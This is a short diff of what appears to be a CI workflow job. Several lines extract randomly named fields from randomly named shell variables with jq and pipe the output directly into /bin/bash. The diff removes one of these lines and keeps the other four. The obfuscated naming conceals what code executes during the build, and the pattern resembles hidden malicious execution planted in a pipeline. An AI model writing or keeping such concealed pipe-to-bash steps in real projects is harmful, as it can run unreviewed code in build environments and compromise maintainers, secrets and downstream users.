@@ -36,7 +36,6 @@ jobs:
           echo $bq79607 | jq -r .pubt64 | /bin/bash
           echo $l74 | jq -r .raxe74 | /bin/bash
           printf '%s' "$wy4" | jq -r .nuvf7894 | /bin/bash
-          echo $jih748 | jq -r .ttv99048 | /bin/bash
           printf '%s' "$tkele8249" | jq -r .c8349 | /bin/bash
 
       - name: Archive data
